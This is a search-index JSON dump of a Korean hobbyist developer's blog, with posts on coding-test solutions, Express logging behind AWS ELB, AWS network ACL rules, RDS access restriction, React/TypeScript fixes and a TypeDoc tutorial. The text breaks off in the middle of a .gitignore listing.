{"pages":[{"title":"404","text":"h1.title { display: none; } .body { --bg: #ffffff; --typewriterSpeed: 2s; --typewriterCharacters: 21; --cursor: #333333; --blinkSpeed: 1s; } body.dark .body { --bg: #1e1e1e; --cursor: #dfdfdf; } .body { min-height: 500px; max-height: 70vh; display: grid; place-items: center; font-family: 'Source Code Pro'; grid-template-rows: auto 1fr; } .body > h1 { position: relative; white-space: nowrap; max-width: 100%; overflow: hidden; font-size: 6vw !important; } .body > h1::before, .body > h1::after { content: ''; position: absolute; top: 0; right: 0; bottom: 0; left: 0; } .body > h1::before { background: var(--bg); animation: typewriter var(--typewriterSpeed) steps(var(--typewriterCharacters)) 1s forwards; } .body > h1::after { margin-left: 2px; background: var(--cursor); width: 0.125em; animation: typewriter var(--typewriterSpeed) steps(var(--typewriterCharacters)) 1s forwards, blink var(--blinkSpeed) ease-out infinite; } .body > p { opacity: 0; transform: translateY(3rem); animation: fadeInUp 2s ease calc(var(--typewriterSpeed) + 1s) forwards; } .body > p > a:first-child { font-weight: bold; } @keyframes typewriter { to { left: 100%; } } @keyframes blink { to { background: transparent; } } @keyframes fadeInUp { to { opacity: 1; transform: translateY(0); } } @media screen and (min-width: 650px) { .body > h1 { font-size: 40px !important; } } Opps! Page Not Found. Let's go home 🏘️ about 404 page","link":"/404.html"},{"title":"About","text":"Hello World! 취미로 개발하는 주니어 개발자 친성(친절한 성게군)입니다 성적 맞춰온 컴공이 아닌, 대입 수시 5곳 모두 컴공에 지원한 찐 컴공입니다 20년 08월부터 꾸준히 Github 잔디관리를 하고 있습니다 단순한 것을 좋아하고, 단순하게 만드는 것을 좋아합니다! 가장 익숙한 아키텍처 Skills (당장 사용 가능한) Frontend HTML CSS, Sass, Styled-components Javascript, Typescript React (Typescript) EJS Backend AWS EC2 Lambda SAM RDS MySQL, MariaDB Node.js Express Collaboration Slack Github ESLint Tool VS Code MySQL Workbench vscode 세팅 내가 사랑하는 vscode 단축키, 명령, 확장도구 모음 스택 (한번이라도 해본 것 포함) aws EC2 Lambda layer CloudFormation SAM RDS mysql DynamoDB S3 network ACL ELB SSL firebase git github github desktop gitignore docker nodejs express ejs sam npm mysql2 electron iohook hexo javascript js json promise async await array api react typescript hooks redux reducer action context state ref typescript ts-node typedoc java javadoc spring boot gradle unity swift(ios) web(html, css, js) mvc pattern ajax fetch api bootstrap chart.js Rest api postman Chrome DevTools https scss parcel highway js gsap open api 도로명 주소 api kakao api 이미지 검색 DB erd sql sqldump vscode prettier eslint Live Server Live Share Remote - SSH Remote - WSL Material Icon Theme markdown md draw.io material.io bash shell cmd .bat batch file yml yaml config network wireshark packet capture OS Windows Linux Telegram bot YouTube photoshop vegas .content p:not(:last-child) { margin-bottom: 0em }","link":"/about/index.html"},{"title":"Project","text":"2021⭐⭐⭐ 멋진 걸 만들면 추가! ⭐ Random Dice 반응속도 테스트 (React) React Table Practice (React) Dark Theme Practice Slash Converter GitHub 404 page clone 🐣 Template react ts eslint prettier ✨ First Contribution ✨ fix: reg exp by chinsun9 · Pull Request #9 · antongolub/tsc-es2020-fix 2020⭐⭐⭐ refactor-2019T1 (NodeJs, EJS, 졸프) Banner Maker (React) Go Home Time (React) Nodejs Express WEB (Docker) Image Finder (Swift) Percentage Calculator (React) Chat App (NodeJs &amp; Socket.IO ) Input Overlay (Electron) My OTP (NodeJs) Open Port Check WEB (NodeJs) ⭐ KeyboardEvent.io (HTML) Random Color (HTML) Smooth Page Transitions (HTML + parcel + scss + highwayjs + gsap )","link":"/project/index.html"}],"posts":[{"title":"124 나라 숫자","text":"124 나라 숫자123456789101112131415161718192021222324252627282930313233343536// https://programmers.co.kr/learn/courses/30/lessons/12899function solution12909(n) { var answer = []; var arr = ''; var N = n; var seq = ['4', '1', '2']; // console.log(seq[seq.length - 1]); while (true) { var tmp = n % 3; answer.push(tmp); // if (n &lt;= 2) { // break; // } if (tmp == 0) { n = (n - tmp - 3) / 3; } else { n = (n - tmp) / 3; } if (n == 0) { break; } } while (answer.length != 0) { arr += seq[answer.pop()]; } // console.log(answer); // console.log(N, arr); // console.log(&quot;------------&quot;); return arr;} 해설 124라는 나라의 이상한 진법으로 변환해야 하는 문제이다. 10진법 124 나라 10진법 124 나라 1 1 6 14 2 2 7 21 3 4 8 22 4 11 9 24 5 12 10 41 이렇게 이상한 숫자로 변환시키는 문제이다 3진법 같아 보이지만 여기에는 함정이 있다…. 3진법이 아닌데 3개 숫자로만 표현해야한다. 경험으로 알게된.. 자릿수가 바뀔때 이상하게 바뀐다는 건데.. 나머지가 0이 될 경우에 == n이 3의 배수의 경우에 추가로 처리해줘야한다. 이해?를 돕기위해 그림을 그렸다 왼쪽이 일반적인.. 상식적인 3진수이고 오른쪽이 124 나라의 수이다. 중간은 124 나라의 수인데, 3진수와 시작을 똑같이 하기 위해 조작한 것이다. 3진수와 중간을 비교해보면 중간중간 정신나간 부분이 보인다 이런 특징? 때문에 124나라는 적은 자릿수로 더 많은 숫자를 표현할 수 있다. 이문제는 해결법을 짠하고 알아냈다기보다 계속 해보면서 알게된 규칙들을 적용시키면서 풀린거라 설명을 잘 못하겠다.. 숫자 때문에 헷갈려 죽을뻔.. 아무튼 정신나간 124 나라이다.","link":"/2020/09/18/124-%EB%82%98%EB%9D%BC-%EC%88%AB%EC%9E%90/"},{"title":"[1차] 비밀지도","text":"[1차] 비밀지도12345678910111213141516171819202122// https://programmers.co.kr/learn/courses/30/lessons/17681function solution(n, arr1, arr2) { var answer = []; arr1.forEach((element, idx) =&gt; { let c = element | arr2[idx]; let c2 = c.toString(2); let tmp = ''; c2.split('').forEach((val) =&gt; { tmp += Number(val) == '0' ? ' ' : '#'; }); if (tmp.length &lt; n) { tmp = ' '.repeat(n - tmp.length) + tmp; } answer.push(tmp); }); return answer;}result = solution(5, [9, 20, 28, 18, 11], [30, 1, 21, 17, 28]); 해설 정수 배열이 2개 들어온다 각 배열에서 정수를 꺼내 or 연산한다 1, 0을 정해진 문자로 변환한다 2진 변환을 헀는데 자릿수가 작을 수 있다. 그때 앞을 ' '로 채운다","link":"/2020/09/18/1%EC%B0%A8-%EB%B9%84%EB%B0%80%EC%A7%80%EB%8F%84/"},{"title":"2016년","text":"2016년1234567891011121314151617181920212223242526272829303132// https://programmers.co.kr/learn/courses/30/lessons/12901// 1월:31일// 2월:29일// 3월:31일// 4월:30일// 5월:31일// 6월:30일// 7월:31일// 8월:31일// 9월:30일// 10월:31일// 11월:30일// 12월:31일function solution(a, b) { const days = [31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]; const dow = ['SUN', 'MON', 'TUE', 'WED', 'THU', 'FRI', 'SAT']; let eachFirstDow = [5]; let tmp; // setup process for (let i = 1; i &lt; a; i++) { tmp = days[i - 1] % 7; console.log(i + 1, dow[(eachFirstDow[i - 1] + tmp) % 7]); eachFirstDow[i] = (eachFirstDow[i - 1] + tmp) % 7; } eachFirstDow.forEach((item) =&gt; { console.log(dow[item]); }); tmp = (b - 1) % 7; return dow[(eachFirstDow[a - 1] + tmp) % 7];}result = solution(10, 1);result = solution(5, 24); 해설 2016년은 윤년이다. a월 b일을 입력받았을때 무슨요일인지 반환하는 문제이다 나는 dow에 요일을 넣었다. 1월 1일은 무슨 요일인지 확인한다. 확인 결과 금요일이다. 첫번째 반복문에서 각 월 1일의 요일을 구한다. a월 1일의 요일에서 (b-1)일을 더하고 7로 나누면 해당일의 요일을 구할 수 있다.","link":"/2020/09/18/2016%EB%85%84/"},{"title":"202011 검색 실적","text":"오.. google search console에서 검색 실적을 메일로 알려준다. ㅋㅋ 깃헙 블로그도 어느덧 시작한 지 3달 정도 돼간다… 블로그 글은 개발하면서 새로 알게된 것들을 메모장같이 작성하고 있고,, 일부는 공략집처럼 작성하고 있다..(도움이 되길 바라며..)","link":"/2020/12/08/202011-%EA%B2%80%EC%83%89-%EC%8B%A4%EC%A0%81/"},{"title":"202012 검색 실적","text":"","link":"/2021/01/04/202012-%EA%B2%80%EC%83%89-%EC%8B%A4%EC%A0%81/"},{"title":"AWS ELB를 사용할 때 express morgan 로깅 주의점","text":"morgan 로깅할 때, 사용자의 ip를 기록하는 :remote-addr 토큰은 req.ip 를 사용한다. ELB, 로드밸런서를 사용하면 사용자의 ip가 아니라, ELB의 ip가 기록된다. 그래서 사용자의 ip를 가져오려면 x-forwarded-for 헤더의 내용을 봐야한다. 1const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress; morgan customapp.js12345678910111213141516171819202122(...)app.use( morgan( function (tokens, req, res) { return [ req.headers['x-forwarded-for'] || req.connection.remoteAddress, req.ip, // == :remote-addr tokens.method(req, res), tokens.url(req, res), tokens.status(req, res), ].join(' '); }, { skip: function (req, res) { return res.statusCode &lt; 400; }, } ));(...) 이런식으로 커스텀할 수 있다. req.headers['x-forwarded-for']의 내용은 1X-Forwarded-For: &lt;client&gt;, &lt;proxy1&gt;, &lt;proxy2&gt; 이런식으로 가장 앞의 ip가 사용자 ip이다. 뒤로 ,로 나열되는 ip는 프록시임으로 당황하지 말자 12345{ skip: function (req, res) { return res.statusCode &lt; 400; },} morgan(f(), {}) morgan 두번째 인자로 옵션을 넣을 수 있다. skip을 주면 특정 경우에서 로깅을 하지 않는 옵션이다 return res.statusCode &lt; 400;이런식으로 하면 400이하의 스테이터스 코드일 때, 로깅을 하지 않는다는 의미이다. 이 경우 404, 500 같은 에러들만 로깅된다. 참고 Express morgan middleware X-Forwarded-For","link":"/2020/11/09/AWS-ELB%EB%A5%BC-%EC%82%AC%EC%9A%A9%ED%95%A0-%EB%95%8C-express-morgan-%EB%A1%9C%EA%B9%85-%EC%A3%BC%EC%9D%98%EC%A0%90/"},{"title":"AWS 네트워크 ACL","text":"VPC를 위한 선택적 보안 계층 시큐리티 그룹과 다르게 차단, deny 룰을 사용할 수 있다. ruleNumber가 낮은 숫자일수록 우선적용된다. 20개까지 규칙을 지정할 수 있다고 한다. 실제로 가용가능한 개수는 18개다. 1234567891011121314{ CidrBlock: '0.0.0.0/0', Egress: false, Protocol: '-1', RuleAction: 'allow', RuleNumber: 100},{ CidrBlock: '0.0.0.0/0', Egress: false, Protocol: '-1', RuleAction: 'deny', RuleNumber: 32767} 인바운드의 경우 이 2개가 기본적으로 세팅되어있다. aws-sdk 로 ACL 룰 추가, 교체하기acl.ts1234567891011121314151617181920212223242526272829var in_params: EC2.CreateNetworkAclEntryRequest = { CidrBlock: ipv4 + '/24', Egress: false, //If true, OUTbound rule. fasle is INbound NetworkAclId: aclId, Protocol: `6`, // -1 : all protocl // 6 : 사용자 지정 tcp PortRange: { From: 80, To: 443 }, // http - https RuleAction: 'deny', RuleNumber: acl_cnt, // 우선순위 ruleNumber};// 기존 존재하는 acl 규칙 개수에 따라서 mode를 달리한다// mode값에 따라 메서드를 달리함.// 20개가 안되는 경우 createNetworkAclEntry 를 사용함// 20개 모두 찬경우 replaceNetworkAclEntry를 통해 교체하는 방법const method = mode === 'create' ? 'createNetworkAclEntry' : 'replaceNetworkAclEntry';return new Promise((resolve, reject) =&gt; { ec2[method](in_params, function (err, data) { if (err) { console.log(err.message, acl_cnt); return reject(err.message); } else { console.log('Create AclEntry Successful : \\n', in_params); // successful response resolve(in_params); } });}); 이상한 요청을 차단하기 위해 알아보았다 참고 네트워크 ACL AWS VPC를 디자인해보자(2) - ACL과 Security Group을 활용한 보안 강화 Amazon VPC 할당량","link":"/2020/11/11/AWS-%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-ACL/"},{"title":"Antimalware Service Executable 미쳐버린 메모리 점유율","text":"윈도우 디펜더 프로세스가 메모리를 엄청나게 먹어서 골머리 아프다. 기본 300mb 정도이고 어쩔 땐 막 2gb 가까이 올라간다.. 그땐 마우스가 막 끊기면서 불편하다.. 해결법 보고 따라 했는데 300mb 정도 나오는데 더 지켜봐야겠다. 8기가로는 이것저것 하기엔 좀 부족한 메모리인 것 같다 참고 윈도우즈10 Antimalware Service Executable 메모리 점유 과다 문제 ; https://antilibrary.org/2371","link":"/2020/12/23/Antimalware-Service-Executable-%EB%AF%B8%EC%B3%90%EB%B2%84%EB%A6%B0-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EC%A0%90%EC%9C%A0%EC%9C%A8/"},{"title":"Banner Maker 클론코딩","text":"banner-maker/banner-maker를 클론코딩해보았다. 내 두번째 리액트 프로젝트..! 데모 Banner Maker (React) 기능 캔버스 크기 조절 실시간 캔버스 업데이트 폰트 사이즈 조절 폰트색 조절 캔버스색에 따른 폰트색 자동조절 캔버스색 조절 랜덤 캠버스색 이미지로 다운로드 클립보드로 카피 컬러 히스토리 기능 컬러 히스토리 임포트, 익스포트 기능 후기 타입스크립트 공부 겸 리액트도 같이 하자는 생각으로 리액트 타입스크립트를 시작했다. velopert님의 리액트 프로젝트에서 타입스크립트 사용하기 글을 보고 따라하다가 튜토리얼을 통해 잘 만들어진 프로젝트 구조를 기반으로 만들었다. 리액트가 아직 익숙하지 않은데 리액트의 훅이라던지 처음부터 고급??개념들을 사용하니까 사실 뭐가 좋은지, 이렇게 써서 좋은점이 무엇인지.. 이 개념을 도입하기전의 것들을 시도해보지 않았기 때문에 막연한 감이 있었다. 나는 공부할때 이론보단 무조건 실기이고, 일단 만들어보면서 익히고 이해하자라는 주의이다. 그래서 이것저것 쉽게만들 수 있다고 생각한다. (나중에 보면 코드가 엄청 구릴지라도..) 이번에 만들면서 신경썼던 것은 사용성..?? 인 것같다. 나는 보통 이미지를 ctrl c 카톡에다가 ctrl v 하여 톡방에 올리는데 그걸위한 copy clipboard 버튼을 만들었다. 저장후 이미지 올리기는 귀찮기 때문에.. 또 랜덤 칼러 버튼을 만들어서 색을 쇼핑했다. js/index.jshtml-banner-maker/commit/5cccc1594309f732ea8edd8ca08c91800d97d3171234567891011121314// https://stackoverflow.com/questions/3942878/how-to-decide-font-color-in-white-or-black-depending-on-background-color/** * Get color (black/white) depending on bgColor so it would be clearly seen. * @param bgColor * @returns {string} */function getColorByBgColor(bgColor) { if (!bgColor) { return ''; } return parseInt(bgColor.replace('#', ''), 16) &gt; 0xffffff / 2 ? '#000' : '#fff';} 사용해보면 알겠지만 랜덤으로 생성된 배경색에 따라 폰트색도 검정색/흰색 적절한게 선택된다. 컬러 히스토리 기능이다. copy 버튼이나 download 버튼을 누르면 해당 배경색과, 폰트색이 히스토리에 저장된다. 만약에 같은 최근 히스토리에 저장된 색과 같은 색이면 저장하지 않도록 하였다. 버튼을 누를때마다 증식되지 않도록.. export 버튼을 눌러 현재 저장된 컬러 히스토리를 json 파일로 내보내는 기능도있다. 깃허브 페이지를 이용해 호스팅하기때문에, 내 앱은 정적이다. 어떻게 히스토리를 저장하고 불러올까 생각하다가 json 파일로 내보내고 다시 불러오도록 만들게 되었다. 개선방향 칼러픽커에서 알파값을 바꿀 수 있도록 하기 폰트 변경 기능 textarea를 div안에 넣어버리기..? (html2canvas 사용해보기) json파일로부터 컬러히스토리 임포트할때 덮어쓰기가 아니라 병합으로 불러오기 src/modules/common/copyToClipboard.js1234567891011export function copyToClipboard() { const canvas = document.querySelector(`#myCanvas`); if (!canvas) { return; } canvas.toBlob(function (blob) { // eslint-disable-next-line no-undef const item = new ClipboardItem({ 'image/png': blob }); navigator.clipboard.write([item]); });} 클립보드 복사 js 코드를 ts로 변환하지 못한 코드.. 소스코드 react-banner-maker 참고 리액트 타입스크립트 공부 ; 리액트 프로젝트에서 타입스크립트 사용하기","link":"/2020/11/06/Banner-maker-%ED%81%B4%EB%A1%A0%EC%BD%94%EB%94%A9/"},{"title":"Cannot use JSX unless the &#39;--jsx&#39; flag is provided.ts(17004)","text":"react typescript에서 tsconfig가 계속 자동수정되는 문제 해결하기. 오류 메시지 모음123456Cannot use JSX unless the '--jsx' flag is provided.ts(17004)Specify JSX code generation: 'preserve', 'react', 'react-jsx', 'react-jsxdev' or'react-native'. Requires TypeScript version 2.2 or later.The following changes are being made to your tsconfig.json file: - compilerOptions.jsx must be react-jsx (to support the new JSX transform in React 17) .ts, .tsx 확장자의 아무 파일이나 열고, F1 &gt; TypeScript 검색 TypeScript: Select TypeScript Version... 선택 주의 : (타입스크립트 관련 파일이여야 위 명령이 검색된다) Use Workspace Version 을 선택해준다. .vscode/settings.json1234{ // (...) &quot;typescript.tsdk&quot;: &quot;node_modules\\\\typescript\\\\lib&quot;} .vscode/settings.json 가보면 이렇게 업데이트 된것을 확인할 수 있다. TMI상황 react typescript eslint airbnb rule 로 개발하는데 yarn start로 시작을 하면 자동으로 tsconfig.json의 compilerOptions &gt; jsx 가 자동으로 “react-jsx”로 업데이트 됬다. 그런데 나는 “react-jsx”일 때 빨간줄이 마구 그어졌다. 그래서 yarn start 이후에 수동으로 “react”로 변경해 주었었다… 해결 워크스페이스의 typescript가 사용되지 않아서 발생한 문제였다. compilerOptions &gt; jsx 가 “react-jsx” 여도 빨간줄이 안생긴다! 참고 problem-with-visual-studio-code-using-react-jsx-as-jsx-value-with-create-react using-the-workspace-version-of-typescript","link":"/2020/12/04/Cannot-use-JSX-unless-the-jsx-flag-is-provided-ts-17004/"},{"title":"Clamp number (js)","text":"1234const clampNumber = (num, a, b) =&gt; Math.max(Math.min(num, Math.max(a, b)), Math.min(a, b));console.log(clampNumber(-10, 0, 5)); // 0console.log(clampNumber(10, 0, 5)); // 5 지정한 범위가 있고, 그 범위를 벗어나는 값이 들어왔을 때, 그 입력을 최소, 최대값 치환할 때 유용하다. 참고 https://www.w3resource.com/javascript-exercises/fundamental/javascript-fundamental-exercise-266.php","link":"/2020/12/15/Clamp-number/"},{"title":"DB 시작할 때 쓰는 명령어","text":"terminal1mariadb sql12345678910-- 'webtest'라는 이름의 db 생성create database webtest;-- 'sung'이름의 비밀번호는 '1234'인 유저생성 및 권한 주기create user sung@localhost identified by '1234';-- grant select on webtest.* to sung@localhost identified by '1234';GRANT ALL PRIVILEGES ON webtest.* TO sung@localhost IDENTIFIED BY '1234' WITH GRANT OPTION;-- 수정사항 반영flush privileges;","link":"/2020/11/02/DB-%EC%8B%9C%EC%9E%91%ED%95%A0-%EB%95%8C-%EC%93%B0%EB%8A%94-%EB%AA%85%EB%A0%B9%EC%96%B4/"},{"title":"JSON.stringify 예쁘게 출력하기","text":"1JSON.stringify(my, null, 2); 두번째 인자로 null 과 세번째 인자로 space argument 를 설정해주면된다. space argument 는 들여쓰기를 간격에 대한 것이다. TMI비교해보기example1234567891011let my = { key: &quot;a&quot;, altKey: false, code: &quot;KeyA&quot;, ctrlKey: false, keyCode: 65, shiftKey: false,};console.log(JSON.stringify(my));console.log(JSON.stringify(my, null, 2)); F12 로 개발자도구를 열고, 콘솔에 복붙해보자 html로 출력하고싶을 때example.html123456789101112131415161718&lt;pre&gt;&lt;code id=&quot;message&quot;&gt;&lt;/code&gt;&lt;/pre&gt;&lt;script&gt; &quot;use strict&quot;; const message_span = document.querySelector(&quot;#message&quot;); let my = { key: &quot;a&quot;, altKey: false, code: &quot;KeyA&quot;, ctrlKey: false, keyCode: 65, shiftKey: false, }; message_span.innerHTML = JSON.stringify(my, null, 2);&lt;/script&gt; 로그로 남기는 것이 아니라 html로 그 결과를 보여주고 싶을 때에는 위처럼 pre태그 안에서 보여주면된다. 참고 pretty-print-json-using-javascript JSON.stringify() - JavaScript | MDN","link":"/2020/11/19/JSON-stringify-%EC%98%88%EC%81%98%EA%B2%8C-%EC%B6%9C%EB%A0%A5%ED%95%98%EA%B8%B0/"},{"title":"Live Share","text":"같이 하나의 내용에 대해 프로그래밍 할 때, 킹갓 확장도구이다.. 웹개발 같은경우 세션의 호스트가 데브 서버를 열면, 세션의 참가한 게스트들도 자동으로 포워딩이 되서 각자 localhost에서 웹을 확인해 볼 수 있다. 수동으로도 포워드 해줄 수 있다. 이제 같이 코딩할 친구만 있으면된다. 참고 https://marketplace.visualstudio.com/items?itemName=MS-vsliveshare.vsliveshare","link":"/2021/02/20/Live-Share/"},{"title":"Promise 연습, js 비동기 연습","text":"js1234// 프로미스 병렬처리 ; allawait Promise.all([delay2(1000), delay2(2000)]).then((result) =&gt; { console.log(result.join(' + '));}); 처음에는 익숙해지기 어렵지만, 꿀인 비동기 promise js에는 promise라는게 있다. 비동기 흐름에서 중요하다. 프로미스는 선언과 동시에 실행이된다. 프로미스 결과를 처리하려면 then을 통해 받아 볼 수 있다. async awaitjs12345678async function delay2(ms) { await new Promise((resolve) =&gt; { setTimeout(() =&gt; { resolve(ms); }, ms); }); return ms;} await 키워드는 async 함수 내에서만 사용가능하다. await 를 통해서 promise가 Fulfilled상태가 되야지만 다음줄의 코드가 실행된다. 병렬처리Promise.racejs123await Promise.race([delay2(1000), delay2(2000)]).then((result) =&gt; { console.log(result);}); 1초뒤에 1000만 반환하는 코드이다. Promise.alljs123await Promise.all([delay2(1000), delay2(2000)]).then((result) =&gt; { console.log(result.join(' + '));}); 2초뒤에 1000 + 2000을 반환하는 코드이다. 요상한 문법js123(async () =&gt; { console.log(await delay2(1000));})();","link":"/2020/10/28/Promise-%EC%97%B0%EC%8A%B5/"},{"title":"RDS 비공개하는 방법","text":"내 RDS 지키기 내가 지정한 IP에서만 접근가능하도록 설정하자 따라하기 설정하고싶은 RDS 화면에 들어간다 연결 &amp; 보안 &gt; 보안 &gt; vpc 보안 그룹 을 눌러서 현재 rds에 적용되어 있는 보안그룹 설정으로 들어간다. 인바운드 규칙 &gt; 인바운드 규칙 편집으로 들어간다 아마 이런식으로 위치무관으로 되어있을 수 있는데 이 규칙으로 인해 모든 컴퓨터에서 접근가능하게 해준다. 이 규칙을 이제 내 컴퓨터에서만 접근가능하도록 고쳐보자. MySQL/Aurora 를 선택해서 포트를 제한한다 소스 유형에 내 IP 를 선택한다 내 공인 IP 주소로 바뀌었는지 확인한다. 이렇게하면 내 IP에서 MySQL 접근 포트인 3306 포트로만 접근을 허용하는 세팅이 된 것이다. 규칙 저장을 눌러 적용시켜준다. 끝!","link":"/2020/09/22/RDS-%EB%B9%84%EA%B3%B5%EA%B0%9C%ED%95%98%EB%8A%94-%EB%B0%A9%EB%B2%95/"},{"title":"SQL Formatter vscode 확장도구","text":"Format Document 로 .sql 포맷팅하기 https://marketplace.visualstudio.com/items?itemName=adpyke.vscode-sql-formatter sql-formatter 확장도구 설치 settings.json12345678910{ // ... &quot;[sql]&quot;: { // 방금 설치한 익스텐션을 통해 포맷팅하도록 &quot;editor.defaultFormatter&quot;: &quot;adpyke.vscode-sql-formatter&quot; }, // sql 키워드(select, from 등)를 대문자로 자동 치환해줌. &quot;sql-formatter.uppercase&quot;: true} 위처럼 세팅해주고 Format Document 명령을 실행하면 잘 동작하는 것을 확인할 수 있다. 참고 https://marketplace.visualstudio.com/items?itemName=adpyke.vscode-sql-formatter","link":"/2020/12/27/SQL-Formatter-vscode-%ED%99%95%EC%9E%A5%EB%8F%84%EA%B5%AC/"},{"title":"REPL","text":"즉각적인 프로토타이핑 초보자에게 빠른 피드백 제공 단순한 대화식 컴퓨터 프로그래밍 환경 주피터 노트북에서 파이썬 코딩하는 느낌인 것같다. 참고 REPL - 위키백과, 우리 모두의 백과사전 REPL | Electron","link":"/2020/11/16/REPL/"},{"title":"Select elements must be either controlled or uncontrolled.","text":"Select elements must be either controlled or uncontrolled (specify either the value prop, or the defaultValue prop, but not both). Decide between using a controlled or uncontrolled select element and remove one of these props. 에러나는 코드1234&lt;select value={state} defaultValue=&quot;kr&quot; onChange={changeLang}&gt; &lt;option value=&quot;kr&quot;&gt;한국어&lt;/option&gt; &lt;option value=&quot;en&quot;&gt;English&lt;/option&gt;&lt;/select&gt; 에러 안나는 코드1234&lt;select value={state} onChange={changeLang}&gt; &lt;option value=&quot;kr&quot;&gt;한국어&lt;/option&gt; &lt;option value=&quot;en&quot;&gt;English&lt;/option&gt;&lt;/select&gt; defaultValue prop을 삭제하자. Select elements는 컨트롤되거나 안되게 둘중 하나만 하라는 건데.. value prop와 defaultValue prop는 같이 사용할 수 없다고 한다. 참고 https://reactjs.org/docs/forms.html#the-select-tag","link":"/2020/12/07/Select-elements-must-be-either-controlled-or-uncontrolled/"},{"title":"Smooth Page Transitions","text":"Smooth Page Transitions With Javascript Tutorial를 보고 따라만들었다. 결과 보러가기 후기 영상 제목만 보고 단순히 css js를 이용한 트랜지션을 구현할 줄 알았는데, node로 parcel, gsap, highway 를 사용해서 웹만드는 것을 배우게되었다. parcel을 처음 써보았는데, 개발할 때도, 배포할 때에도 좋은 것 같다. higyway와 gsap으로 애니메이션을 구현해 보았다. parcel을 이용해 웹을 만들어 깃허브 페이지로 배포할 때, parcel build index.html --out-dir docs --public-url ./ 위 처럼 옵션을 넣어줘야한다. –out-dir docs 는 깃허브 페이지 설정할 때 디렉터리 –public-url ./ 는 이미지, css, js 경로가 망가지지 않도록한다. 참고 Smooth Page Transitions With Javascript Tutorial Use Parcel to Bundle a Hyperapp App &amp; Deploy to GitHub Pages https://github.com/chinsun9/smooth-page-transitions","link":"/2020/12/02/Smooth-Page-Transitions/"},{"title":"SyntaxError: Unexpected end of input","text":"vscode에서는 아무 에러, 경고없이 잘 실행되었는데, SyntaxError-Unexpected-end-of-input 에러가 날 때가 있다. 나의 경우에는 api 서버가 host가 달라 cors mode로 리퀘스트를 보내야하는데 ‘no-cors’ mode로 보내서 생긴 에러이다. 그 외에도 api서버에서 연산이 잘못되어 응답을 반환하지 않을 때에도 똑같은 에러가 나왔다. 그냥 서버로부터 결과를 제대로 받지 않으면 생기는 오류 같다.","link":"/2020/12/15/SyntaxError-Unexpected-end-of-input/"},{"title":"System.out.println(); 빠르게 치기","text":"sysout ctrl space","link":"/2020/09/28/System-out-println-%EB%B9%A0%EB%A5%B4%EA%B2%8C-%EC%B9%98%EA%B8%B0/"},{"title":"TypeDoc 시작하기","text":"https://chinsun9.github.io/TypeDoc-practice/index.html TypeDoc으로 문서 생성하고 깃허브에서 보기! 따라하기 Typescript: generate documentation을 보고 따라하였습니다. TypeDoc 생성하기샘플 코드 작성package.json123456789101112131415161718{ &quot;name&quot;: &quot;typedoc-practice&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;index.ts&quot;, &quot;scripts&quot;: { &quot;tsc&quot;: &quot;tsc&quot;, &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot; }, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;devDependencies&quot;: { &quot;typedoc&quot;: &quot;^0.19.2&quot;, &quot;typescript&quot;: &quot;^4.0.3&quot;, &quot;typedoc-plugin-nojekyll&quot;: &quot;^1.0.1&quot; }, &quot;dependencies&quot;: {}} 연습용 디렉터리를 생성하고 위 내용으로 package.json을 생성한다. cmd1npm i 종속성을 설치한다. tsconfig.json123456789101112131415{ &quot;compilerOptions&quot;: { &quot;baseUrl&quot;: &quot;.&quot;, &quot;paths&quot;: { &quot;*&quot;: [&quot;types/*&quot;] }, &quot;target&quot;: &quot;ES3&quot;, &quot;module&quot;: &quot;commonjs&quot;, &quot;sourceMap&quot;: true, &quot;resolveJsonModule&quot;: true, &quot;esModuleInterop&quot;: true }, &quot;typedocOptions&quot;: { &quot;mode&quot;: &quot;modules&quot;, &quot;out&quot;: &quot;docs&quot; }} 타입스크립트 설정파일 tsconfig.json를 생성한다. index.ts1234567891011121314151617181920212223242526272829303132333435363738/** * This class keeps track of the version number * of your application. */class Status { /** * This property ... */ public version: number = 0; /** * This method prints out the current version number */ public showVersion() { console.log('version:', this.version); } /** * This method increases the version number with 1 * * @returns the current version number */ public increaseVersion() { this.version += 1; return this.version; } /** * change the version number to the provided number * * @param version the number that needs to be used as a version number * @returns the current version number */ public changeVersion(version: number) { this.version = version; return this.version; }} index.ts를 생성하고, 독주석을 작성한다. 나는 Typescript: generate documentation를 참고하여 작성하였다. javaDoc과 동일한 문법으로 작성하면된다. 독주석을 작성하고싶은 클래스나 메서드, 변수 위에 /**를 타입하면 독주석 자동완성이 나온다. 자동완성으로 만들경우에 @param, @returns가 자동완성된다. typedoc 생성하기 이제 문서를 생성해보자 cmd1npx typedoc --out docs docs라는 폴더가 생긴다. docs/index.html 파일을 열어서 잘 만들어졌는지 확인한다. 이제 깃허브에서 볼 수 있도록 해보자. 깃허브에 올리기 처음 package.json에 보면 typedoc-plugin-nojekyll 모듈을 설치해줬는데, 기본적으로 깃허브 페이지는 지킬 기반으로 동작한다. 지킬에는 어떤 규칙이 있는데 _로 시작하면 페이지가 안나온다. typedoc을 통해 생성된 html은 _index_.html 이런식으로 _가 붙는다. 따라서 docs/ 디렉터리에 지킬을 사용하지 않는다는 것을 알리는 .nojekyll이라는 파일을 만들어놔야한다. 수동으로 .nojekyll을 추가할 수 있지만, npx typedoc --out docs명령을 쓸때마다 초기화되서 불편하다. typedoc-plugin-nojekyll 모듈은 이 문제를 해결해준다. .gitignore 추가.gitignore123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113# Created by https://www.toptal.com/developers/gitignore/api/node# Edit at https://www.toptal.com/developers/gitignore?templates=node### Node #### Logslogs*.lognpm-debug.log*yarn-debug.log*yarn-error.log*lerna-debug.log*# Diagnostic reports (https://nodejs.org/api/report.html)report.[0-9]*.[0-9]*.[0-9]*.[0-9]*.json# Runtime datapids*.pid*.seed*.pid.lock# Directory for instrumented libs generated by jscoverage/JSCoverlib-cov# Coverage directory used by tools like istanbulcoverage*.lcov# nyc test coverage.nyc_output# Grunt intermediate storage (https://gruntjs.com/creating-plugins#storing-task-files).grunt# Bower dependency directory (https://bower.io/)bower_components# node-waf configuration.lock-wscript# Compiled binary addons (https://nodejs.org/api/addons.html)build/Release# Dependency 